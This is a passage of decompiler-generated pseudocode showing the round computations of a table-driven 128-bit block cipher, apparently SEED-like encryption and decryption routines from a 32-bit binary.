  v12 = (v11 + v10) ^ v4;
  v99 = v12 ^ *(_DWORD *)(a3 + 16);
  v84 = dword_528928[(unsigned __int8)(v59 ^ v99 ^ *(_BYTE *)(a3 + 20))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v59 ^ v99 ^ *(_WORD *)(a3 + 20)) >> 8)] ^ dword_529128[(unsigned __int8)((v59 ^ (unsigned int)v99 ^ *(_DWORD *)(a3 + 20)) >> 16)] ^ dword_529528[(v59 ^ (unsigned int)v99 ^ *(_DWORD *)(a3 + 20)) >> 24];
  v13 = dword_528928[(unsigned __int8)(v84 + v99)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v84 + v99) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v84 + v99) >> 16)] ^ dword_529528[(unsigned int)(v84 + v99) >> 24];
  v14 = dword_528928[(unsigned __int8)(v13 + v84)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v13 + v84) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v13 + v84) >> 16)] ^ dword_529528[(unsigned int)(v13 + v84) >> 24];
  v75 = v14 ^ v74;
  v67 = (v14 + v13) ^ v66;
  v15 = v75 ^ v67 ^ *(_DWORD *)(a3 + 24) ^ *(_DWORD *)(a3 + 28);
  v100 = v67 ^ *(_DWORD *)(a3 + 24);
  v85 = dword_528928[(unsigned __int8)v15] ^ dword_528D28[BYTE1(v15)] ^ dword_529128[BYTE2(v15)] ^ dword_529528[HIBYTE(v15)];
  v16 = dword_528928[(unsigned __int8)(v85 + v100)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v85 + v100) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v85 + v100) >> 16)] ^ dword_529528[(unsigned int)(v85 + v100) >> 24];
  v17 = dword_528928[(unsigned __int8)(v16 + v85)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v16 + v85) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v16 + v85) >> 16)] ^ dword_529528[(unsigned int)(v16 + v85) >> 24];
  v60 = v17 ^ v59;
  v18 = (v17 + v16) ^ v12;
  v101 = v18 ^ *(_DWORD *)(a3 + 32);
  v86 = dword_528928[(unsigned __int8)(v60 ^ v101 ^ *(_BYTE *)(a3 + 36))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v60 ^ v101 ^ *(_WORD *)(a3 + 36)) >> 8)] ^ dword_529128[(unsigned __int8)((v60 ^ (unsigned int)v101 ^ *(_DWORD *)(a3 + 36)) >> 16)] ^ dword_529528[(v60 ^ (unsigned int)v101 ^ *(_DWORD *)(a3 + 36)) >> 24];
  v19 = dword_528928[(unsigned __int8)(v86 + v101)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v86 + v101) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v86 + v101) >> 16)] ^ dword_529528[(unsigned int)(v86 + v101) >> 24];
  v20 = dword_528928[(unsigned __int8)(v19 + v86)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v19 + v86) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v19 + v86) >> 16)] ^ dword_529528[(unsigned int)(v19 + v86) >> 24];
  v76 = v20 ^ v75;
  v68 = (v20 + v19) ^ v67;
  v21 = v76 ^ v68 ^ *(_DWORD *)(a3 + 40) ^ *(_DWORD *)(a3 + 44);
  v102 = v68 ^ *(_DWORD *)(a3 + 40);
  v87 = dword_528928[(unsigned __int8)v21] ^ dword_528D28[BYTE1(v21)] ^ dword_529128[BYTE2(v21)] ^ dword_529528[HIBYTE(v21)];
  v22 = dword_528928[(unsigned __int8)(v87 + v102)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v87 + v102) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v87 + v102) >> 16)] ^ dword_529528[(unsigned int)(v87 + v102) >> 24];
  v23 = dword_528928[(unsigned __int8)(v22 + v87)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v22 + v87) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v22 + v87) >> 16)] ^ dword_529528[(unsigned int)(v22 + v87) >> 24];
  v61 = v23 ^ v60;
  v24 = (v23 + v22) ^ v18;
  v103 = v24 ^ *(_DWORD *)(a3 + 48);
  v88 = dword_528928[(unsigned __int8)(v61 ^ v103 ^ *(_BYTE *)(a3 + 52))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v61 ^ v103 ^ *(_WORD *)(a3 + 52)) >> 8)] ^ dword_529128[(unsigned __int8)((v61 ^ (unsigned int)v103 ^ *(_DWORD *)(a3 + 52)) >> 16)] ^ dword_529528[(v61 ^ (unsigned int)v103 ^ *(_DWORD *)(a3 + 52)) >> 24];
  v25 = dword_528928[(unsigned __int8)(v88 + v103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v88 + v103) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v88 + v103) >> 16)] ^ dword_529528[(unsigned int)(v88 + v103) >> 24];
  v26 = dword_528928[(unsigned __int8)(v25 + v88)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v25 + v88) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v25 + v88) >> 16)] ^ dword_529528[(unsigned int)(v25 + v88) >> 24];
  v77 = v26 ^ v76;
  v69 = (v26 + v25) ^ v68;
  v27 = v77 ^ v69 ^ *(_DWORD *)(a3 + 56) ^ *(_DWORD *)(a3 + 60);
  v104 = v69 ^ *(_DWORD *)(a3 + 56);
  v89 = dword_528928[(unsigned __int8)v27] ^ dword_528D28[BYTE1(v27)] ^ dword_529128[BYTE2(v27)] ^ dword_529528[HIBYTE(v27)];
  v28 = dword_528928[(unsigned __int8)(v89 + v104)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v89 + v104) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v89 + v104) >> 16)] ^ dword_529528[(unsigned int)(v89 + v104) >> 24];
  v29 = dword_528928[(unsigned __int8)(v28 + v89)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v28 + v89) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v28 + v89) >> 16)] ^ dword_529528[(unsigned int)(v28 + v89) >> 24];
  v62 = v29 ^ v61;
  v30 = (v29 + v28) ^ v24;
  v105 = v30 ^ *(_DWORD *)(a3 + 64);
  v90 = dword_528928[(unsigned __int8)(v62 ^ v105 ^ *(_BYTE *)(a3 + 68))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v62 ^ v105 ^ *(_WORD *)(a3 + 68)) >> 8)] ^ dword_529128[(unsigned __int8)((v62 ^ (unsigned int)v105 ^ *(_DWORD *)(a3 + 68)) >> 16)] ^ dword_529528[(v62 ^ (unsigned int)v105 ^ *(_DWORD *)(a3 + 68)) >> 24];
  v31 = dword_528928[(unsigned __int8)(v90 + v105)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v90 + v105) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v90 + v105) >> 16)] ^ dword_529528[(unsigned int)(v90 + v105) >> 24];
  v32 = dword_528928[(unsigned __int8)(v31 + v90)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v31 + v90) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v31 + v90) >> 16)] ^ dword_529528[(unsigned int)(v31 + v90) >> 24];
  v78 = v32 ^ v77;
  v70 = (v32 + v31) ^ v69;
  v33 = v78 ^ v70 ^ *(_DWORD *)(a3 + 72) ^ *(_DWORD *)(a3 + 76);
  v106 = v70 ^ *(_DWORD *)(a3 + 72);
  v91 = dword_528928[(unsigned __int8)v33] ^ dword_528D28[BYTE1(v33)] ^ dword_529128[BYTE2(v33)] ^ dword_529528[HIBYTE(v33)];
  v34 = dword_528928[(unsigned __int8)(v91 + v106)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v91 + v106) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v91 + v106) >> 16)] ^ dword_529528[(unsigned int)(v91 + v106) >> 24];
  v35 = dword_528928[(unsigned __int8)(v34 + v91)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v34 + v91) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v34 + v91) >> 16)] ^ dword_529528[(unsigned int)(v34 + v91) >> 24];
  v63 = v35 ^ v62;
  v36 = (v35 + v34) ^ v30;
  v107 = v36 ^ *(_DWORD *)(a3 + 80);
  v92 = dword_528928[(unsigned __int8)(v63 ^ v107 ^ *(_BYTE *)(a3 + 84))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v63 ^ v107 ^ *(_WORD *)(a3 + 84)) >> 8)] ^ dword_529128[(unsigned __int8)((v63 ^ (unsigned int)v107 ^ *(_DWORD *)(a3 + 84)) >> 16)] ^ dword_529528[(v63 ^ (unsigned int)v107 ^ *(_DWORD *)(a3 + 84)) >> 24];
  v37 = dword_528928[(unsigned __int8)(v92 + v107)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v92 + v107) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v92 + v107) >> 16)] ^ dword_529528[(unsigned int)(v92 + v107) >> 24];
  v38 = dword_528928[(unsigned __int8)(v37 + v92)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v37 + v92) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v37 + v92) >> 16)] ^ dword_529528[(unsigned int)(v37 + v92) >> 24];
  v79 = v38 ^ v78;
  v71 = (v38 + v37) ^ v70;
  v39 = v79 ^ v71 ^ *(_DWORD *)(a3 + 88) ^ *(_DWORD *)(a3 + 92);
  v108 = v71 ^ *(_DWORD *)(a3 + 88);
  v93 = dword_528928[(unsigned __int8)v39] ^ dword_528D28[BYTE1(v39)] ^ dword_529128[BYTE2(v39)] ^ dword_529528[HIBYTE(v39)];
  v40 = dword_528928[(unsigned __int8)(v93 + v108)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v93 + v108) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v93 + v108) >> 16)] ^ dword_529528[(unsigned int)(v93 + v108) >> 24];
  v41 = dword_528928[(unsigned __int8)(v40 + v93)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v40 + v93) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v40 + v93) >> 16)] ^ dword_529528[(unsigned int)(v40 + v93) >> 24];
  v64 = v41 ^ v63;
  v42 = (v41 + v40) ^ v36;
  v109 = v42 ^ *(_DWORD *)(a3 + 96);
  v94 = dword_528928[(unsigned __int8)(v64 ^ v109 ^ *(_BYTE *)(a3 + 100))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v64 ^ v109 ^ *(_WORD *)(a3 + 100)) >> 8)] ^ dword_529128[(unsigned __int8)((v64 ^ (unsigned int)v109 ^ *(_DWORD *)(a3 + 100)) >> 16)] ^ dword_529528[(v64 ^ (unsigned int)v109 ^ *(_DWORD *)(a3 + 100)) >> 24];
  v43 = dword_528928[(unsigned __int8)(v94 + v109)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v94 + v109) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v94 + v109) >> 16)] ^ dword_529528[(unsigned int)(v94 + v109) >> 24];
  v44 = dword_528928[(unsigned __int8)(v43 + v94)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v43 + v94) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v43 + v94) >> 16)] ^ dword_529528[(unsigned int)(v43 + v94) >> 24];
  v80 = v44 ^ v79;
  v72 = (v44 + v43) ^ v71;
  v45 = v80 ^ v72 ^ *(_DWORD *)(a3 + 104) ^ *(_DWORD *)(a3 + 108);
  v110 = v72 ^ *(_DWORD *)(a3 + 104);
  v95 = dword_528928[(unsigned __int8)v45] ^ dword_528D28[BYTE1(v45)] ^ dword_529128[BYTE2(v45)] ^ dword_529528[HIBYTE(v45)];
  v46 = dword_528928[(unsigned __int8)(v95 + v110)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v95 + v110) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v95 + v110) >> 16)] ^ dword_529528[(unsigned int)(v95 + v110) >> 24];
  v47 = dword_528928[(unsigned __int8)(v46 + v95)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v46 + v95) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v46 + v95) >> 16)] ^ dword_529528[(unsigned int)(v46 + v95) >> 24];
  v65 = v47 ^ v64;
  v48 = (v47 + v46) ^ v42;
  v111 = v48 ^ *(_DWORD *)(a3 + 112);
  v96 = dword_528928[(unsigned __int8)(v65 ^ v111 ^ *(_BYTE *)(a3 + 116))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v65 ^ v111 ^ *(_WORD *)(a3 + 116)) >> 8)] ^ dword_529128[(unsigned __int8)((v65 ^ (unsigned int)v111 ^ *(_DWORD *)(a3 + 116)) >> 16)] ^ dword_529528[(v65 ^ (unsigned int)v111 ^ *(_DWORD *)(a3 + 116)) >> 24];
  v49 = dword_528928[(unsigned __int8)(v96 + v111)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v96 + v111) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v96 + v111) >> 16)] ^ dword_529528[(unsigned int)(v96 + v111) >> 24];
  v50 = dword_528928[(unsigned __int8)(v49 + v96)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v49 + v96) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v49 + v96) >> 16)] ^ dword_529528[(unsigned int)(v49 + v96) >> 24];
  v81 = v50 ^ v80;
  v73 = (v50 + v49) ^ v72;
  v51 = v73 ^ *(_DWORD *)(a3 + 120);
  v52 = v81 ^ v51 ^ *(_DWORD *)(a3 + 124);
  v53 = dword_528928[(unsigned __int8)v52] ^ dword_528D28[BYTE1(v52)] ^ dword_529128[BYTE2(v52)] ^ dword_529528[HIBYTE(v52)];
  v54 = dword_528928[(unsigned __int8)(v53 + v51)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v53 + v51) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v53 + v51) >> 16)] ^ dword_529528[(unsigned int)(v53 + v51) >> 24];
  v55 = dword_528928[(unsigned __int8)(v54 + v53)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v54 + v53) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v54 + v53) >> 16)] ^ dword_529528[(unsigned int)(v54 + v53) >> 24];
  v56 = (v55 + v54) ^ v48;
  result = a2;
  *a2 = HIBYTE(v56);
  a2[3] = v56;
  a2[1] = BYTE2(v56);
  a2[4] = (v55 ^ (unsigned int)v65) >> 24;
  a2[7] = v55 ^ v65;
  a2[5] = (v55 ^ (unsigned int)v65) >> 16;
  a2[6] = (unsigned __int16)(v55 ^ v65) >> 8;
  a2[8] = HIBYTE(v73);
  a2[9] = BYTE2(v73);
  a2[10] = BYTE1(v73);
  a2[11] = v73;
  a2[12] = HIBYTE(v81);
  a2[13] = BYTE2(v81);
  a2[2] = BYTE1(v56);
  a2[14] = BYTE1(v81);
  a2[15] = v81;
  return result;
}
// 528928: using guessed type int dword_528928[256];
// 528D28: using guessed type int dword_528D28[256];
// 529128: using guessed type int dword_529128[256];
// 529528: using guessed type int dword_529528[256];

//----- (004B5EC0) --------------------------------------------------------
_BYTE *__cdecl sub_4B5EC0(unsigned __int8 *a1, _BYTE *a2, int a3)
{
  int v4; // ecx
  unsigned int v6; // edx
  int v7; // edi
  int v8; // ebp
  unsigned int v9; // edx
  int v10; // esi
  int v11; // edi
  int v12; // ecx
  int v13; // esi
  int v14; // edi
  unsigned int v15; // edx
  int v16; // esi
  int v17; // edi
  int v18; // ecx
  int v19; // esi
  int v20; // edi
  unsigned int v21; // edx
  int v22; // esi
  int v23; // edi
  int v24; // ecx
  int v25; // esi
  int v26; // edi
  unsigned int v27; // edx
  int v28; // esi
  int v29; // edi
  int v30; // ecx
  int v31; // esi
  int v32; // edi
  unsigned int v33; // edx
  int v34; // esi
  int v35; // edi
  int v36; // ecx
  int v37; // esi
  int v38; // edi
  unsigned int v39; // edx
  int v40; // esi
  int v41; // edi
  int v42; // ecx
  int v43; // esi
  int v44; // edi
  unsigned int v45; // edx
  int v46; // esi
  int v47; // edi
  int v48; // ecx
  int v49; // esi
  int v50; // edi
  int v51; // ebx
  unsigned int v52; // esi
  int v53; // edx
  int v54; // esi
  int v55; // edi
  int v56; // ecx
  _BYTE *result; // eax
  int v58; // [esp+10h] [ebp-10h]
  int v59; // [esp+10h] [ebp-10h]
  int v60; // [esp+10h] [ebp-10h]
  int v61; // [esp+10h] [ebp-10h]
  int v62; // [esp+10h] [ebp-10h]
  int v63; // [esp+10h] [ebp-10h]
  int v64; // [esp+10h] [ebp-10h]
  int v65; // [esp+10h] [ebp-10h]
  int v66; // [esp+14h] [ebp-Ch]
  int v67; // [esp+14h] [ebp-Ch]
  int v68; // [esp+14h] [ebp-Ch]
  int v69; // [esp+14h] [ebp-Ch]
  int v70; // [esp+14h] [ebp-Ch]
  int v71; // [esp+14h] [ebp-Ch]
  int v72; // [esp+14h] [ebp-Ch]
  int v73; // [esp+14h] [ebp-Ch]
  int v74; // [esp+18h] [ebp-8h]
  int v75; // [esp+18h] [ebp-8h]
  int v76; // [esp+18h] [ebp-8h]
  int v77; // [esp+18h] [ebp-8h]
  int v78; // [esp+18h] [ebp-8h]
  int v79; // [esp+18h] [ebp-8h]
  int v80; // [esp+18h] [ebp-8h]
  int v81; // [esp+18h] [ebp-8h]
  int v82; // [esp+24h] [ebp+4h]
  int v83; // [esp+24h] [ebp+4h]
  int v84; // [esp+24h] [ebp+4h]
  int v85; // [esp+24h] [ebp+4h]
  int v86; // [esp+24h] [ebp+4h]
  int v87; // [esp+24h] [ebp+4h]
  int v88; // [esp+24h] [ebp+4h]
  int v89; // [esp+24h] [ebp+4h]
  int v90; // [esp+24h] [ebp+4h]
  int v91; // [esp+24h] [ebp+4h]
  int v92; // [esp+24h] [ebp+4h]
  int v93; // [esp+24h] [ebp+4h]
  int v94; // [esp+24h] [ebp+4h]
  int v95; // [esp+24h] [ebp+4h]
  int v96; // [esp+24h] [ebp+4h]
  int v97; // [esp+2Ch] [ebp+Ch]
  int v98; // [esp+2Ch] [ebp+Ch]
  int v99; // [esp+2Ch] [ebp+Ch]
  int v100; // [esp+2Ch] [ebp+Ch]
  int v101; // [esp+2Ch] [ebp+Ch]
  int v102; // [esp+2Ch] [ebp+Ch]
  int v103; // [esp+2Ch] [ebp+Ch]
  int v104; // [esp+2Ch] [ebp+Ch]
  int v105; // [esp+2Ch] [ebp+Ch]
  int v106; // [esp+2Ch] [ebp+Ch]
  int v107; // [esp+2Ch] [ebp+Ch]
  int v108; // [esp+2Ch] [ebp+Ch]
  int v109; // [esp+2Ch] [ebp+Ch]
  int v110; // [esp+2Ch] [ebp+Ch]
  int v111; // [esp+2Ch] [ebp+Ch]

  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v58 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  v97 = v4 ^ *(_DWORD *)(a3 + 120);
  v6 = v58 ^ v97 ^ *(_DWORD *)(a3 + 124);
  v82 = dword_528928[(unsigned __int8)v6] ^ dword_528D28[BYTE1(v6)] ^ dword_529128[BYTE2(v6)] ^ dword_529528[HIBYTE(v6)];
  v7 = dword_528928[(unsigned __int8)(v82 + v97)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v82 + v97) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v82 + v97) >> 16)] ^ dword_529528[(unsigned int)(v82 + v97) >> 24];
  v8 = dword_528928[(unsigned __int8)(v7 + v82)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v7 + v82) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v7 + v82) >> 16)] ^ dword_529528[(unsigned int)(v7 + v82) >> 24];
  v66 = (v8 + v7) ^ (a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8));
  v74 = v8 ^ (a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8));
  v9 = v74 ^ v66 ^ *(_DWORD *)(a3 + 112) ^ *(_DWORD *)(a3 + 116);
  v98 = v66 ^ *(_DWORD *)(a3 + 112);
  v83 = dword_528928[(unsigned __int8)v9] ^ dword_528D28[BYTE1(v9)] ^ dword_529128[BYTE2(v9)] ^ dword_529528[HIBYTE(v9)];
  v10 = dword_528928[(unsigned __int8)(v83 + v98)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v83 + v98) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v83 + v98) >> 16)] ^ dword_529528[(unsigned int)(v83 + v98) >> 24];
  v11 = dword_528928[(unsigned __int8)(v10 + v83)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v10 + v83) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v10 + v83) >> 16)] ^ dword_529528[(unsigned int)(v10 + v83) >> 24];
  v59 = v11 ^ v58;
  v12 = (v11 + v10) ^ v4;
  v99 = v12 ^ *(_DWORD *)(a3 + 104);
  v84 = dword_528928[(unsigned __int8)(v59 ^ v99 ^ *(_BYTE *)(a3 + 108))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v59 ^ v99 ^ *(_WORD *)(a3 + 108)) >> 8)] ^ dword_529128[(unsigned __int8)((v59 ^ (unsigned int)v99 ^ *(_DWORD *)(a3 + 108)) >> 16)] ^ dword_529528[(v59 ^ (unsigned int)v99 ^ *(_DWORD *)(a3 + 108)) >> 24];
  v13 = dword_528928[(unsigned __int8)(v84 + v99)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v84 + v99) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v84 + v99) >> 16)] ^ dword_529528[(unsigned int)(v84 + v99) >> 24];
  v14 = dword_528928[(unsigned __int8)(v13 + v84)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v13 + v84) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v13 + v84) >> 16)] ^ dword_529528[(unsigned int)(v13 + v84) >> 24];
  v75 = v14 ^ v74;
  v67 = (v14 + v13) ^ v66;
  v15 = v75 ^ v67 ^ *(_DWORD *)(a3 + 96) ^ *(_DWORD *)(a3 + 100);
  v100 = v67 ^ *(_DWORD *)(a3 + 96);
  v85 = dword_528928[(unsigned __int8)v15] ^ dword_528D28[BYTE1(v15)] ^ dword_529128[BYTE2(v15)] ^ dword_529528[HIBYTE(v15)];
  v16 = dword_528928[(unsigned __int8)(v85 + v100)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v85 + v100) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v85 + v100) >> 16)] ^ dword_529528[(unsigned int)(v85 + v100) >> 24];
  v17 = dword_528928[(unsigned __int8)(v16 + v85)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v16 + v85) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v16 + v85) >> 16)] ^ dword_529528[(unsigned int)(v16 + v85) >> 24];
  v60 = v17 ^ v59;
  v18 = (v17 + v16) ^ v12;
  v101 = v18 ^ *(_DWORD *)(a3 + 88);
  v86 = dword_528928[(unsigned __int8)(v60 ^ v101 ^ *(_BYTE *)(a3 + 92))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v60 ^ v101 ^ *(_WORD *)(a3 + 92)) >> 8)] ^ dword_529128[(unsigned __int8)((v60 ^ (unsigned int)v101 ^ *(_DWORD *)(a3 + 92)) >> 16)] ^ dword_529528[(v60 ^ (unsigned int)v101 ^ *(_DWORD *)(a3 + 92)) >> 24];
  v19 = dword_528928[(unsigned __int8)(v86 + v101)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v86 + v101) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v86 + v101) >> 16)] ^ dword_529528[(unsigned int)(v86 + v101) >> 24];
  v20 = dword_528928[(unsigned __int8)(v19 + v86)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v19 + v86) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v19 + v86) >> 16)] ^ dword_529528[(unsigned int)(v19 + v86) >> 24];
  v76 = v20 ^ v75;
  v68 = (v20 + v19) ^ v67;
  v21 = v76 ^ v68 ^ *(_DWORD *)(a3 + 80) ^ *(_DWORD *)(a3 + 84);
  v102 = v68 ^ *(_DWORD *)(a3 + 80);
  v87 = dword_528928[(unsigned __int8)v21] ^ dword_528D28[BYTE1(v21)] ^ dword_529128[BYTE2(v21)] ^ dword_529528[HIBYTE(v21)];
  v22 = dword_528928[(unsigned __int8)(v87 + v102)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v87 + v102) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v87 + v102) >> 16)] ^ dword_529528[(unsigned int)(v87 + v102) >> 24];
  v23 = dword_528928[(unsigned __int8)(v22 + v87)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v22 + v87) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v22 + v87) >> 16)] ^ dword_529528[(unsigned int)(v22 + v87) >> 24];
  v61 = v23 ^ v60;
  v24 = (v23 + v22) ^ v18;
  v103 = v24 ^ *(_DWORD *)(a3 + 72);
  v88 = dword_528928[(unsigned __int8)(v61 ^ v103 ^ *(_BYTE *)(a3 + 76))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v61 ^ v103 ^ *(_WORD *)(a3 + 76)) >> 8)] ^ dword_529128[(unsigned __int8)((v61 ^ (unsigned int)v103 ^ *(_DWORD *)(a3 + 76)) >> 16)] ^ dword_529528[(v61 ^ (unsigned int)v103 ^ *(_DWORD *)(a3 + 76)) >> 24];
  v25 = dword_528928[(unsigned __int8)(v88 + v103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v88 + v103) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v88 + v103) >> 16)] ^ dword_529528[(unsigned int)(v88 + v103) >> 24];
  v26 = dword_528928[(unsigned __int8)(v25 + v88)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v25 + v88) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v25 + v88) >> 16)] ^ dword_529528[(unsigned int)(v25 + v88) >> 24];
  v77 = v26 ^ v76;
  v69 = (v26 + v25) ^ v68;
  v27 = v77 ^ v69 ^ *(_DWORD *)(a3 + 64) ^ *(_DWORD *)(a3 + 68);
  v104 = v69 ^ *(_DWORD *)(a3 + 64);
  v89 = dword_528928[(unsigned __int8)v27] ^ dword_528D28[BYTE1(v27)] ^ dword_529128[BYTE2(v27)] ^ dword_529528[HIBYTE(v27)];
  v28 = dword_528928[(unsigned __int8)(v89 + v104)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v89 + v104) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v89 + v104) >> 16)] ^ dword_529528[(unsigned int)(v89 + v104) >> 24];
  v29 = dword_528928[(unsigned __int8)(v28 + v89)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v28 + v89) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v28 + v89) >> 16)] ^ dword_529528[(unsigned int)(v28 + v89) >> 24];
  v62 = v29 ^ v61;
  v30 = (v29 + v28) ^ v24;
  v105 = v30 ^ *(_DWORD *)(a3 + 56);
  v90 = dword_528928[(unsigned __int8)(v62 ^ v105 ^ *(_BYTE *)(a3 + 60))] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v62 ^ v105 ^ *(_WORD *)(a3 + 60)) >> 8)] ^ dword_529128[(unsigned __int8)((v62 ^ (unsigned int)v105 ^ *(_DWORD *)(a3 + 60)) >> 16)] ^ dword_529528[(v62 ^ (unsigned int)v105 ^ *(_DWORD *)(a3 + 60)) >> 24];
  v31 = dword_528928[(unsigned __int8)(v90 + v105)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v90 + v105) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v90 + v105) >> 16)] ^ dword_529528[(unsigned int)(v90 + v105) >> 24];
  v32 = dword_528928[(unsigned __int8)(v31 + v90)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v31 + v90) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v31 + v90) >> 16)] ^ dword_529528[(unsigned int)(v31 + v90) >> 24];
  v78 = v32 ^ v77;
  v70 = (v32 + v31) ^ v69;
  v33 = v78 ^ v70 ^ *(_DWORD *)(a3 + 48) ^ *(_DWORD *)(a3 + 52);
  v106 = v70 ^ *(_DWORD *)(a3 + 48);
  v91 = dword_528928[(unsigned __int8)v33] ^ dword_528D28[BYTE1(v33)] ^ dword_529128[BYTE2(v33)] ^ dword_529528[HIBYTE(v33)];
  v34 = dword_528928[(unsigned __int8)(v91 + v106)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v91 + v106) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v91 + v106) >> 16)] ^ dword_529528[(unsigned int)(v91 + v106) >> 24];
  v35 = dword_528928[(unsigned __int8)(v34 + v91)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v34 + v91) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v34 + v91) >> 16)] ^ dword_529528[(unsigned int)(v34 + v91) >> 24];
  v63 = v35 ^ v62;
  v36 = (v35 + v34) ^ v30;
  v107 = v36 ^ *(_DWORD *)(a3 + 40);
